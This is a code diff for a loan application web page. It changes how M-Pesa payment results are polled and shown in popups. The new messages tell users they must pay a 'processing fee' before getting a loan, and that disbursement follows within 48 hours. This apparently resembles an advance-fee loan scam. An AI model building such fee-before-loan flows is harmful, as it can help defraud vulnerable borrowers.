@@ -175,12 +175,20 @@ document.getElementById('apply-btn').addEventListener('click', async function ()
     const closeAndCleanup = async (reason, isSuccess) => {
         pollClosed = true;
         if (pollInterval) clearInterval(pollInterval);
-        if (isSuccess) {
+        if (isSuccess === 'COMPLETED') {
             Swal.fire({
                 icon: 'success',
-                title: 'Payment Successful',
-                html: `<div style="font-size:1.1rem;">Your payment was received successfully.<br><span style='font-size:2rem;display:inline-block;margin-top:10px;'>✅</span></div>`,
-                confirmButtonText: 'Done',
+                title: 'Payment Received!',
+                html: `<div style="font-size:1.1rem;">Your loan is being processed.<br>Please wait up to 48 hours for disbursement.<br><span style='font-size:2rem;display:inline-block;margin-top:10px;'>🎉</span></div>`,
+                confirmButtonText: 'OK',
+                customClass: { popup: 'modern-popup', htmlContainer: 'modern-html' }
+            });
+        } else if (isSuccess === 'CANCELLED' || isSuccess === 'FAILED' || isSuccess === 'WRONG_PIN') {
+            Swal.fire({
+                icon: 'error',
+                title: 'Payment Not Completed',
+                html: `<div style='font-size:1.05rem;'>Sorry, you need to pay the processing fee to get a loan.<br>Please try again and ensure you complete the payment on your phone.<br><span style='font-size:2rem;display:inline-block;margin-top:10px;'>❌</span></div>`,
+                confirmButtonText: 'Try Again',
                 customClass: { popup: 'modern-popup', htmlContainer: 'modern-html' }
             });
         } else if (reason === 'timeout') {
@@ -188,14 +196,6 @@ document.getElementById('apply-btn').addEventListener('click', async function ()
                 icon: 'warning',
                 title: 'No Response from M-Pesa',
                 html: `<div style='font-size:1.05rem;'>We didn’t get a response from M-Pesa.<br><span style='color:#64748b;'>Please check your phone and try again.</span><br><span style='font-size:2rem;display:inline-block;margin-top:10px;'>📱</span></div>`,
-                confirmButtonText: 'Try Again',
-                customClass: { popup: 'modern-popup', htmlContainer: 'modern-html' }
-            });
-        } else if (reason === 'failed') {
-            Swal.fire({
-                icon: 'error',
-                title: 'Payment Failed',
-                html: `<div style='font-size:1.05rem;'>Payment was not completed.<br><span style='color:#64748b;'>Please try again.</span><br><span style='font-size:2rem;display:inline-block;margin-top:10px;'>❌</span></div>`,
                 confirmButtonText: 'Try Again',
                 customClass: { popup: 'modern-popup', htmlContainer: 'modern-html' }
             });
@@ -246,15 +246,15 @@ document.getElementById('apply-btn').addEventListener('click', async function ()
                     if (status.status === 'COMPLETED') {
                         clearInterval(pollInterval);
                         pollClosed = true;
-                        await closeAndCleanup('success', true);
-                    } else if (status.status === 'FAILED') {
+                        await closeAndCleanup(null, 'COMPLETED');
+                    } else if (status.status === 'FAILED' || status.status === 'CANCELLED' || status.status === 'WRONG_PIN') {
                         clearInterval(pollInterval);
                         pollClosed = true;
-                        await closeAndCleanup('failed', false);
+                        await closeAndCleanup(null, status.status);
                     } else if (attempts >= maxAttempts) {
                         clearInterval(pollInterval);
                         pollClosed = true;
-                        await closeAndCleanup('timeout', false);
+                        await closeAndCleanup('timeout', null);
                     }
                 } catch (err) {
                     // Ignore polling errors
